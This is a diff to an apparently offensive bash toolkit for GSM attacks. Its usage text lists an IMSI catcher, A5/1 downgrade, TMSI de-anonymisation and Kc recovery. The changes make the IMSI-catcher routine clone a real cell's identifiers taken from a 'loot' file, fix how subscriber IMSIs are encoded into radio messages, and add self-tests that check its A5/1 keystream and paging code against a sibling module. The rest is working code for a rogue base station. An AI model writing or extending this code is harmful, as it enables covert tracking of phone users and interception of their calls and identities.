@@ -1630,12 +1630,43 @@ gatk_build_immediate_assignment() {
     return 0
 }
 
+# ── the cell 06_gsm_air.sh decoded, as this module's defaults ───────────
+# `06_gsm_air --decode-si` persists every SI3/SI4 it reads into
+# loot/gsm_air/si.tsv. The catcher should inherit the cell it is about to clone
+# rather than make the operator retype five fields off a TSV page. An explicit
+# argument always wins; this only fills what was left out.
+GATK_SI_STORE="${IMSISTING_ROOT:-}/loot/gsm_air/si.tsv"
+
+gatk_cell_from_si_store() {
+    [[ -r "$GATK_SI_STORE" ]] || return 1
+    awk -F'\t' '
+        NR == 1 { for (i = 1; i <= NF; i++) col[$i] = i; next }
+        (col["mcc"] && $(col["mcc"]) != "" && $(col["lac"]) != "") { line = $0 }
+        END {
+            if (line == "") exit 1
+            n = split(line, f, "\t")
+            printf "mcc\t%s\nmnc\t%s\nlac_hex\t%04x\nci_hex\t%04x\n",
+                f[col["mcc"]], f[col["mnc"]], f[col["lac"]], f[col["cell_id"]]
+        }' "$GATK_SI_STORE"
+}
+
 gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-imsi] [pam] [res] [ccch-conf] [start-fn]
-    local mcc="${1:-262}" mnc="${2:-01}" lac ci arfcn bsic target
-    lac=$(gatk_norm_hex "${3:-00f1}"); ci=$(gatk_norm_hex "${4:-00a1}")
-    arfcn="${5:-62}"; bsic="${6:-7}"
-    target="${7:-310150123456789}"
+    local mcc="${1:-}" mnc="${2:-}" lac="${3:-}" ci="${4:-}" arfcn="${5:-62}"
+    local bsic="${6:-7}" target="${7:-310150123456789}"
     local pam="${8:-2}" res="${9:-1}" conf="${10:-001}" startfn="${11:-0}"
+    local source="arguments"
+    if [[ -z "$mcc" ]]; then
+        local cell
+        if cell=$(gatk_cell_from_si_store); then
+            mcc=$(printf '%s\n' "$cell" | awk -F'\t' '$1=="mcc"{print $2; exit}')
+            mnc=$(printf '%s\n' "$cell" | awk -F'\t' '$1=="mnc"{print $2; exit}')
+            lac=$(printf '%s\n' "$cell" | awk -F'\t' '$1=="lac_hex"{print $2; exit}')
+            ci=$(printf '%s\n' "$cell"  | awk -F'\t' '$1=="ci_hex"{print $2; exit}')
+            source="si_store"
+        fi
+    fi
+    mcc="${mcc:-262}" mnc="${mnc:-01}"
+    lac=$(gatk_norm_hex "${lac:-00f1}"); ci=$(gatk_norm_hex "${ci:-00a1}")
     [[ "$arfcn" =~ ^[0-9]+$ ]] || { printf 'ERROR\tARFCN must be a number\n' >&2; return 2; }
     [[ "$bsic" =~ ^[0-9]+$ ]] && (( bsic <= 63 )) || {
         printf 'ERROR\tBSIC must be 0..63 (got %s)\n' "$bsic" >&2; return 2; }
@@ -1665,6 +1696,7 @@ gatk_vector_imsi_catcher() {   # [mcc] [mnc] [lac] [ci] [arfcn] [bsic] [target-i
     printf 'plmn_colour_code\t%s\n' "$(( bsic / 8 ))"
     printf 'bs_colour_code\t%s\n' "$(( bsic % 8 ))"
     printf 'mcc\t%s\nmnc\t%s\nlac\t%s\nci\t%s\n' "$mcc" "$mnc" "$lac" "$ci"
+    printf 'cell_source\t%s\n' "$source"
     printf 'lai_octets\t%s\n' "$lai"
     printf 'ccch_conf\t%s\n' "$conf"
     printf 'bs_ccch_sdcch_comb\t%s\n' "$comb"
@@ -2693,6 +2725,16 @@ gatk_selftest() {
     # 6 octets on the wire: IEI 17, length 05, value octet f4, then 4 TMSI octets.
     chk mi-tmsi-len "$(printf '%s' "$(gatk_mobile_identity_tmsi 0f200001)" | wc -c | tr -d ' ')" "14"
     chk mi-tmsi-type "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_tmsi 0f200001)" | awk -F'\t' '/^type-of-identity/{print $2}')" "4"
+    # The IMSI arm, pinned to the octets 06_gsm_air.sh's own vector names, so
+    # the two codecs cannot drift: 310150123456789 is 39 01 51 10 32 54 76 98
+    # behind IEI 17 and length 08. The 15-digit case has no filler; the
+    # 14-digit one ends in F, and both must read back to the digits they came
+    # from (a builder that fails its own decoder is the bug this pins).
+    chk mi-imsi-octets "$(gatk_mobile_identity_imsi 310150123456789)" "17083901511032547698"
+    chk mi-imsi-rt     "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_imsi 310150123456789)" | awk -F'\t' '/^imsi/{print $2}')" "310150123456789"
+    chk mi-imsi-even   "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_imsi 26201123456789)" | awk -F'\t' '/^imsi/{print $2}')" "26201123456789"
+    chk mi-imsi-odd-flag "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_imsi 310150123456789)" | awk -F'\t' '/^odd-even-indicator/{print $2}')" "1"
+    chk mi-imsi-bad-rc "$(gatk_mobile_identity_imsi 12345 >/dev/null 2>&1; echo $?)" "2"
     chk build-cipher-a52 "$(gatk_build_cipher_mode A5/2)" "06350304"
     chk build-cipher-a51 "$(gatk_build_cipher_mode A5/1)" "06350104"
     # Cipher Response is always present; CR=1 sets bit 4 of its value octet.
@@ -2955,6 +2997,46 @@ gatk_selftest() {
     ( gatk_bcch_frame "60$(printf '00%.0s' $(seq 1 22))" ) >/dev/null 2>&1
     rc=$?; chk bcch-toobig-rc "$rc" "2"
 
+    # ── cross-checks against 06_gsm_air.sh ──────────────────────────────
+    # Two implementations of the same standards live in this tree: the A5/1
+    # core, the paging arithmetic and the mobile-identity packing. Each was
+    # written to stand alone, because this module must answer whether or not
+    # 06_gsm_air.sh is present. That is the reason for the duplication and the
+    # reason it is dangerous: nothing in either module is obliged to notice the
+    # other drifting. These checks are that obligation, and they run as a
+    # subprocess so the sibling module's CLI, not its source, is the referee.
+    # A tree without the sibling reports SKIP and says so — a skip is never a
+    # pass, and this module never invents a pass for a check it did not run.
+    local sib="$IMSISTING_ROOT/modules/06_gsm_air.sh"
+    if [[ -r "$sib" ]]; then
+        local kc cnt ours theirs
+        for kc in 0011223344556677 1223456789abcdef ffffffffffffffff; do
+            for cnt in 0 16384; do
+                # Both sides emit packed hex: 228 bits -> 57 octets.
+                ours=$(gatk_a5_1_hex "$kc" "$cnt" 228)
+                theirs=$(bash "$sib" --a5-1-keystream "$kc" 228 "$cnt" 2>/dev/null |
+                         awk -F'\t' '$1=="keystream"{print $2; exit}')
+                chk "x-a51-agree-$kc-$cnt" "$ours" "$theirs"
+            done
+        done
+        # 06 folds BS_AG_BLKS_RES into the block count, this module keeps the
+        # two apart; both must reach the same group, block and CCCH slot.
+        local sibpg
+        sibpg=$(bash "$sib" --paging-group 262011234567890 2 1 2>/dev/null)
+        chk x-page-group  "$(fld "$(gatk_paging_schedule 262011234567890 2 1 8)" paging_group)" \
+                          "$(printf '%s\n' "$sibpg" | awk -F'\t' '$1=="paging_group"{print $2}')"
+        chk x-page-block  "$(fld "$(gatk_paging_schedule 262011234567890 2 1 8)" paging_block_index)" \
+                          "$(printf '%s\n' "$sibpg" | awk -F'\t' '$1=="paging_block_index"{print $2}')"
+        chk x-page-slot   "$(fld "$(gatk_paging_schedule 262011234567890 2 1 8)" ccch_block)" \
+                          "$(printf '%s\n' "$sibpg" | awk -F'\t' '$1=="ccch_slot"{print $2}')"
+        # The identity codec, against the sibling's decoder: the IE this module
+        # builds must decode to the digits the sibling names for it.
+        chk x-ident-imsi  "$(bash "$sib" --identity-exposure "$(printf '0609%s' "$(gatk_mobile_identity_imsi 310150123456789 | cut -c5-)")" 2>/dev/null |
+                             awk -F'\t' '$1=="imsi"{print $2}')" "310150123456789"
+    else
+        printf 'SKIP\tx-a51-agree-%s\t06_gsm_air.sh not found under %s\n' "-" "$IMSISTING_ROOT/modules"
+    fi
+
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
 }
@@ -2964,7 +3046,7 @@ gatk_menu() {
     local c
     while true; do
         banner
-        echo -e "  ${C_MAG}=== GSM attack ===${C_RESET}"
+        echo -e "  ${C_MAG}=== GSM catcher ===${C_RESET}"
         echo -e "  tx sdr: ${C_GRN}$(gatk_find_tx_sdr || echo none)${C_RESET}"
         echo -e "  rx sdr: ${C_GRN}$(gatk_find_rx_sdr || echo none)${C_RESET}"
         echo -e "  plans:  ${C_GRN}$(gatk_plan_count)${C_RESET}  ${C_DIM}$GATK_DIR${C_RESET}\n"
@@ -3339,10 +3421,11 @@ class A52:
 # engineered by Briceno/Goldberg/Wagner (1998); the published reference
 # design, which is why it is the one GSM cipher with an official vector.
 #
-# This lives in 11's own core rather than calling gair_a5_1_keystream from
-# 06_gsm_air.sh, because a Kc search has to run whether or not that module
-# was sourced first. The selftest asserts the two implementations agree, so
-# the duplication cannot drift silently.
+# This lives in this module's own core rather than calling gair_a5_1_keystream
+# from 06_gsm_air.sh, because a Kc search has to run whether or not that module
+# is present. The selftest runs the sibling's CLI over three keys and two
+# counts and asserts the keystreams are identical (`x-a51-agree-*`), so the
+# duplication cannot drift silently.
 _R1MASK, _R2MASK, _R3MASK = 0x07FFFF, 0x3FFFFF, 0x7FFFFF
 _R1MID,  _R2MID,  _R3MID  = 0x000100, 0x000400, 0x000400
 _R1TAPS, _R2TAPS, _R3TAPS = 0x072000, 0x300000, 0x700080
@@ -3662,14 +3745,21 @@ gatk_mobile_identity_imsi() {   # <imsi-digits-6..15>
     local d="${1:-}"
     [[ "$d" =~ ^[0-9]{6,15}$ ]] || {
         printf 'ERROR\tIMSI must be 6..15 digits\n' >&2; return 2; }
-    # Pad the last odd position with F, then swap each nibble pair.
-    local pad="$d"
-    if (( ${#pad} % 2 )); then pad="${pad}f"; fi
-    local out=""
-    local i
-    for (( i=0; i<${#pad}; i+=2 )); do out+="${pad:$((i+1)):1}${pad:$i:1}"; done
-    local len=$(( ${#out} / 2 + 1 ))
-    printf '17%02x%x%s\n' "$len" 1 "$out"
+    # TS 24.008 10.5.1.4, wired exactly as 06_gsm_air.sh's own vector reads it
+    # (IMSI 310150123456789 -> 39 01 51 10 32 54 76 98):
+    #   octet 3 = high nibble: the FIRST digit;  low nibble: type 001 | odd bit
+    #   every octet after it = two digits, LOW NIBBLE FIRST
+    # The odd/even indicator is 1 when the last digit is the filler F, which is
+    # needed for an even-length IMSI: the first digit is carried by octet 3, so
+    # an even count leaves an odd number of digits behind.
+    local digits="$d"
+    if (( ${#digits} % 2 == 0 )); then digits+="f"; fi
+    local first="${digits:0:1}" rest="${digits:1}" out="" i
+    out=$(printf '%02x' $(( (16#$first << 4) | 0x08 | 0x01 )))
+    for (( i = 0; i < ${#rest}; i += 2 )); do
+        out+=$(printf '%02x' $(( 16#${rest:i:1} | (16#${rest:i+1:1} << 4) )))
+    done
+    printf '17%02x%s\n' "$(( ${#out} / 2 ))" "$out"
 }
 
 gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
@@ -3698,6 +3788,20 @@ gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
     printf 'odd-even-indicator\t%s\n' "$oei"
     if [[ "$toi" == "4" ]]; then
         printf 'tmsi\t%s\n' "${body:2}"
+    elif [[ "$toi" == "1" || "$toi" == "2" || "$toi" == "3" ]]; then
+        # BCD digits: octet 3's HIGH nibble is the first digit, then two digits
+        # per octet low-nibble-first. An odd/even indicator of 1 means the final
+        # high nibble is the filler F and is not a digit.
+        local digits="${body:0:1}" j
+        for (( j = 2; j < ${#body}; j += 2 )); do
+            digits+="${body:j+1:1}${body:j:1}"
+        done
+        (( oei == 1 )) && digits="${digits%f}"
+        case "$toi" in
+            1) printf 'imsi\t%s\n'   "$digits" ;;
+            2) printf 'imei\t%s\n'   "$digits" ;;
+            3) printf 'imeisv\t%s\n' "$digits" ;;
+        esac
     fi
 }
 
@@ -3867,9 +3971,9 @@ gatk_a5_4_bits() {   # <kc-hex32> <count> [bits]
 
 # ── A5/1 keystream ──────────────────────────────────────────────────────
 # A5/1 lives in this module's own core (see the A51 note there) so that a Kc
-# search runs whether or not 06_gsm_air.sh was sourced first. When that
-# module *is* loaded the selftest cross-checks the two, which is what stops
-# the duplication drifting.
+# search runs whether or not 06_gsm_air.sh is present. The selftest invokes
+# that module's CLI and asserts the two keystreams match (`x-a51-agree-*`) —
+# a check that actually runs, which is what stops the duplication drifting.
 # A5/1's 22-bit COUNT is NOT the frame number. It is T1 (11 bits) || T3
 # (6 bits) || T2 (5 bits) - the same split the SCH broadcasts, packed in that
 # order (T3 before T2, which is the part everyone gets wrong). Verified
@@ -4228,7 +4332,7 @@ gatk_cli_main() {
         --decrypt)             gatk_cmd_decrypt "${1:-}" "${2:-}" "${3:-a5-2}" "${4:-0}" ;;
         --tx-ack)              gatk_cmd_tx_ack ;;
         --transmit)            gatk_cmd_transmit "$@" ;;
-        --vector-imsi-catcher) gatk_vector_imsi_catcher "${1:-262}" "${2:-01}" "${3:-00f1}" "${4:-00a1}" "${5:-62}" "${6:-7}" "${7:-}" "${8:-2}" "${9:-1}" "${10:-001}" "${11:-0}" ;;
+        --vector-imsi-catcher) gatk_vector_imsi_catcher "$@" ;;
         --vector-a5-downgrade) gatk_vector_a5_downgrade "${1:-A5/2}" "${2:-4}" "${3:-0}" "${4:-0}" "${5:-0f200001}" ;;
         --vector-tmsi-deanon)  gatk_vector_tmsi_deanon "${1:-}" "${2:-}" "${3:-2}" "${4:-0}" "${5:-001}" "${6:-0}" "${7:-}" ;;
         --vector-kc-recovery)  gatk_vector_kc_recovery "${1:-}" "${2:-2}" "${3:-0}" ;;
@@ -4263,7 +4367,7 @@ gatk_cli_main() {
         --menu)                gatk_menu ;;
         *)
             cat >&2 <<EOF
-GSM Attack — IMSI catcher, A5/1 downgrade, TMSI de-anonymisation, Kc recovery
+GSM Catcher — IMSI catcher, A5/1 downgrade, TMSI de-anonymisation, Kc recovery
 
 Usage: $0 COMMAND
   --status-tsv                 radio and plan state as TSV
